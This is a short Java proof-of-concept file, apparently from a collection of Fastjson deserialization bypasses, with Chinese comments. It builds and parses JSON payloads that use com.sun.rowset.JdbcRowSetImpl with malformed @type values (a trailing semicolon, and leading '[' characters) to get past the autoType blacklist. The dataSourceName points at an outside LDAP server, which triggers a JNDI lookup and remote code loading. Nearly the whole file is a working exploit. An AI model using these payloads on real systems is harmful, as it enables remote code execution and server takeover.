package vul;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Bypass_43 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //需要开启AutoTypeSupport
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("@type", "com.sun.rowset.JdbcRowSetImpl;");     //TypeUtils.loadClass里的解析问题
        jsonObject.put("dataSourceName", "ldap://10.195.188.28:1389/a8tnop");
        jsonObject.put("autoCommit", false);
        String json = jsonObject.toJSONString();
        System.out.println(json);

        //依然是解析问题
        String poc = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://192.168.126.1:1389/us9a9o\",\"autoCommit\":false}";
        JSON.parse(poc);
    }
}
